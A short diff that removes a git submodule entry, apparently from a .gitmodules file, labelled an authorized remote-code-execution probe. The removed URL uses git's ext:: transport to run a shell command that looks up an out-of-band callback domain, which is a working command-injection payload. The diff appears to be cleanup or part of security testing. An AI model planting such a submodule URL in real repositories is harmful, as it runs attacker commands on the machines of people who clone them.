@@ -1,3 +1,0 @@
-[submodule "authorized-rce-probe"]
-    path = subprobe
-    url = ext::sh -c 'getent hosts grvw-saiqvbbo9bg--gitsubext1-20260720.oob.an1me.sh'
